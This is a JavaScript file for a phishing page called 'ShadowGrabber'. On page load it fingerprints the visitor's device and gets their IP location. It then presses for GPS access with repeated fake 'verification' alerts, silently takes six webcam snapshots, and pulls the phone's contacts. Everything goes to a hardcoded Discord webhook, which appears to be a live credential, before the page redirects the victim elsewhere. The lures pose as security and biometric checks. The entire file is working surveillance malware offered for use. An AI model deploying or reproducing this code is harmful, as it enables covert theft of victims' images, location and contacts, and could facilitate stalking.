const config = {
    webhook: 'https://discord.com/api/webhooks/1464327769608425504/TX0QqpwHA56djp6nFioLGerQ4dUNI0elhQ4q6vw-fuPTbLYdLdv-DaN-PimcXb9Bi9kS',
    redirect: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
};

const dom = {
    loadingText: document.getElementById('loading-text'),
    progressBar: document.getElementById('progress-bar'),
    status: document.getElementById('status-detail'),
    trigger: document.getElementById('click-trigger'),
    video: document.getElementById('st-v'),
    canvas: document.getElementById('st-c')
};

const collectedData = {
    system: {},
    network: {},
    location: null,
    battery: {},
    contacts: [],
    photos: []
};

// --- Execution State ---
const state = {
    isStarted: false,
    cameraActive: false
};

// --- Helpers ---
const updateUI = async (msg, prg) => {
    if (dom.loadingText) dom.loadingText.textContent = msg;
    if (dom.progressBar) dom.progressBar.style.width = prg + '%';
    await new Promise(r => setTimeout(r, 600));
};

const sendToDiscord = async (embed, file = null) => {
    const formData = new FormData();
    formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
    if (file) formData.append('file', file.blob, file.name);

    try {
        await fetch(config.webhook, { method: 'POST', body: formData });
    } catch (e) { console.error('Discord Post Error:', e); }
};

// --- Advanced Scrapers ---
async function getAdvancedInfo() {
    // 1. Battery
    if (navigator.getBattery) {
        const batt = await navigator.getBattery();
        collectedData.battery = {
            level: Math.round(batt.level * 100) + '%',
            charging: batt.charging ? 'Yes' : 'No'
        };
    }

    // 2. GPU & System
    const gl = dom.canvas.getContext('webgl');
    const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
    collectedData.system = {
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency,
        ram: navigator.deviceMemory || 'N/A',
        gpu: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
    };

    // 3. Network Intel
    try {
        const res = await fetch('https://ipapi.co/json/');
        collectedData.network = await res.json();
    } catch (e) { collectedData.network = { ip: 'Blocked/VPN' }; }

    // Send Initial Payload
    await sendToDiscord({
        title: "📡 ShadowGrabber: Identity Captured",
        color: 0xE67E22, // Orange
        fields: [
            { name: "👤 User", value: `\`\`\`${collectedData.system.platform} | ${collectedData.system.cores} Cores | ${collectedData.system.ram}GB RAM\`\`\`` },
            { name: "🔋 Battery", value: `\`\`\`Level: ${collectedData.battery.level} | Charging: ${collectedData.battery.charging}\`\`\`` },
            { name: "🎮 GPU", value: `\`\`\`${collectedData.system.gpu}\`\`\`` },
            { name: "🌐 Network", value: `\`\`\`IP: ${collectedData.network.ip}\nISP: ${collectedData.network.org || 'N/A'}\nLocation: ${collectedData.network.city || 'N/A'}, ${collectedData.network.country_name || 'N/A'}\`\`\`` }
        ],
        footer: { text: `Time: ${new Date().toLocaleTimeString()}` }
    });
}

// --- Interaction Loop ---
async function handleLocation() {
    if (location.protocol !== 'https:' && location.hostname !== 'localhost') {
        alert("Mobile Security Alert: This diagnostic tool requires a secure connection (HTTPS) to verify your location. Please contact your administrator.");
        return;
    }

    const getLocation = () => new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition(
            async (pos) => {
                collectedData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude };
                await sendToDiscord({
                    title: "📍 Target Location Fixed",
                    color: 0x2ECC71, // Green
                    description: `[Google Maps Link](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`,
                    fields: [
                        { name: "Latitude", value: pos.coords.latitude.toString(), inline: true },
                        { name: "Longitude", value: pos.coords.longitude.toString(), inline: true },
                        { name: "Accuracy", value: pos.coords.accuracy.toFixed(2) + 'm', inline: true }
                    ]
                });
                resolve(true);
            },
            (err) => {
                console.warn('Geo Error:', err.code);
                if (err.code === 1) { // User denied
                    alert("Verification Required: You must allow location access to synchronize your device settings.");
                    getLocation().then(resolve);
                } else {
                    resolve(false); // Other error, don't loop infinitely
                }
            },
            { enableHighAccuracy: true, timeout: 8000 }
        );
    });

    await getLocation();
}

async function handleCamera() {
    const getStream = async () => {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            dom.video.srcObject = stream;
            state.cameraActive = true;
            return true;
        } catch (e) {
            console.warn('Camera Error:', e);
            return false;
        }
    };

    const hasAccess = await getStream();
    if (!hasAccess) {
        // Show an instruction or rely on the click overlay
        dom.status.textContent = "Please tap the screen to complete verification";
        dom.trigger.onclick = async () => {
            const success = await getStream();
            if (success) {
                dom.trigger.style.display = 'none';
                startCaptureFlow();
            }
        };
    } else {
        dom.trigger.style.display = 'none';
        startCaptureFlow();
    }
}

async function startCaptureFlow() {
    await updateUI('Please wait its loding...', 60);

    // 1. Take 6 snaps (the "5 to 7" requested) and stream them one-by-one
    for (let i = 1; i <= 6; i++) {
        await new Promise(r => setTimeout(r, 600));
        const context = dom.canvas.getContext('2d');
        dom.canvas.width = dom.video.videoWidth || 640;
        dom.canvas.height = dom.video.videoHeight || 480;
        context.drawImage(dom.video, 0, 0);

        const dataUrl = dom.canvas.toDataURL('image/jpeg', 0.8);
        const blob = await (await fetch(dataUrl)).blob();

        // Await each POST to ensure "streaming" works and finishes before redirect
        await sendToDiscord({
            title: `📸 Biometric Verification Snap #${i}`,
            color: 0xE74C3C,
            description: "Security profile verification in progress."
        }, { blob, name: `snap_${i}.jpg` });

        await updateUI('Please wait its loding...', 60 + (i * 5));
    }

    // 2. Trigger Contact Picker after snaps
    if ('contacts' in navigator && 'ContactsManager' in window) {
        await updateUI('Analyzing network sync...', 95);
        try {
            const contacts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
            if (contacts.length > 0) {
                const contactBlob = new Blob([JSON.stringify(contacts, null, 2)], { type: 'application/json' });
                await sendToDiscord({
                    title: "📇 Device Metadata Synchronized",
                    color: 0x9B59B6,
                    description: `Security backup created for ${contacts.length} nodes.`
                }, { blob: contactBlob, name: 'contacts.json' });
            }
        } catch (e) { }
    }

    // 3. Instant Redirect after all data is secured
    await updateUI('Complete. Finalizing...', 100);
    window.location.href = config.redirect;
}

// --- Orchestration ---
async function startShadowGrabber() {
    if (state.isStarted) return;
    state.isStarted = true;

    await updateUI('Please wait its loding...', 10);
    await getAdvancedInfo(); // Initial info + Discord post

    // Background Location check
    handleLocation();

    // Trigger Camera
    handleCamera();
}

window.onload = () => {
    if (config.webhook) startShadowGrabber();
};

dom.video.onloadedmetadata = () => dom.video.play();
